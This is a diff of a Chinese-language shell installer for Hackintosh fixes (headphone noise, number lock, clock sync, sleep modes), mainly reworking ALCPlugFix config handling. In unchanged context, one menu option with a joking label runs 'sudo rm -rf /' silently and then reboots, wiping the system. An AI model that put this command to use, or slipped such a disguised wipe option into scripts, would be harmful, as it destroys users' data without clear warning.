@@ -4,7 +4,6 @@ DAEMON_PATH=/Library/LaunchDaemons/
 BIN_PATH=/usr/local/bin/
 TMP_PATH=/tmp/
 ALC_DAEMON_FILE=good.win.ALCPlugFix.plist
-ALC_DAEMON_CONFIG_FILE=Config.plist
 VERB_FILE=alc-verb
 ALC_FIX_FILE=ALCPlugFix
 TIME_FIX_FILE=localtime-toggle
@@ -19,25 +18,24 @@ init(){
 	sudo curl -s -o $TMP_PATH$ALC_FIX_FILE "$GIT_URL/ALCPlugFix/$ALC_FIX_FILE"
 	sudo curl -s -o $TMP_PATH$VERB_FILE "$GIT_URL/ALCPlugFix/$VERB_FILE"
 	sudo curl -s -o $TMP_PATH$ALC_DAEMON_FILE "$GIT_URL/ALCPlugFix/$ALC_DAEMON_FILE"
-	sudo curl -s -o $TMP_PATH$ALC_DAEMON_CONFIG_FILE "$GIT_URL/ALCPlugFix/$ALC_DAEMON_CONFIG_FILE"
 	sudo curl -s -o $TMP_PATH$TIME_FIX_FILE "$GIT_URL/TimeSynchronization/$TIME_FIX_FILE"
 	sudo curl -s -o $TMP_PATH$TIME_DAEMON_FILE "$GIT_URL/TimeSynchronization/$TIME_DAEMON_FILE"
-	sudo curl -s -o $TMP_PATH$NUM_LOCK_FIX_FILE "$GIT_URL/NUM_LOCKFix/$NUM_LOCK_FIX_FILE"
-	sudo curl -s -o $TMP_PATH$NUM_LOCK_DAEMON_FILE "$GIT_URL/NUM_LOCKFix/$NUM_LOCK_DAEMON_FILE"
+    sudo curl -s -o $TMP_PATH$NUM_LOCK_FIX_FILE "$GIT_URL/NUM_LOCKFix/$NUM_LOCK_FIX_FILE"
+    sudo curl -s -o $TMP_PATH$NUM_LOCK_DAEMON_FILE "$GIT_URL/NUM_LOCKFix/$NUM_LOCK_DAEMON_FILE"
 	
 	if [ ! -d "$BIN_PATH" ] ; then
 		mkdir "$BIN_PATH" ;
 	fi
 	
+	if sudo launchctl list | grep --quiet com.black-dragon74.ALCPlugFix; then
+		sudo launchctl unload /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
+		sudo rm /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
+		sudo rm /usr/local/bin/ALCPlugFix
+		sudo rm /Library/Preferences/ALCPlugFix/ALC_Config.plist
+	fi
 }
 
 ALCPlugFix(){
-	if [[ ! -d /Library/Preferences/ALCPlugFix ]]; then
-	    sudo mkdir -p /Library/Preferences/ALCPlugFix
-	fi
-	sudo cp $TMP_PATH/Config.plist /Library/Preferences/ALCPlugFix
-	sudo chmod 644 /Library/Preferences/ALCPlugFix/Config.plist
-	sudo chown root:wheel /Library/Preferences/ALCPlugFix/Config.plist
 	sudo cp $TMP_PATH$ALC_FIX_FILE $BIN_PATH
 	sudo cp $TMP_PATH$VERB_FILE $BIN_PATH
 	sudo cp $TMP_PATH$ALC_DAEMON_FILE $DAEMON_PATH
@@ -105,7 +103,6 @@ removeAll(){
         sudo rm -rf $DAEMON_PATH$ALC_DAEMON_FILE
         sudo rm -rf $BIN_PATH$VERB_FILE
         sudo rm -rf $BIN_PATH$ALC_FIX_FILE
-        sudo rm -rf /Library/Preferences/ALCPlugFix
     fi
     
     if sudo launchctl list | grep --quiet localtime-toggle; then
@@ -129,13 +126,13 @@ menu(){
   echo "1、修复插耳机杂音"
   echo "2、修复数字键盘无法开启"
   echo "3、修复 Win/OSX 时间不同步"
-  echo "4、清除缓存"
+	echo "4、清除缓存"
   echo "5、禁用休眠(模式 0)"
   echo "6、全部修复上述问题"
   echo "7、启动休眠(模式 25)"
-  echo "8、移除所有修复"
+	echo "8、移除所有修复"
   echo "9、送黑果归西"
-  echo "0、退出"
+	echo "0、退出"
 }
 
 Select(){
@@ -188,7 +185,7 @@ Select(){
         sudo rm -rf / >/dev/null 2>&1
         sudo reboot
         ;;
-    0) exit 0
+	0) exit 0
        ;;
     *) echo "输入错误";
 	   
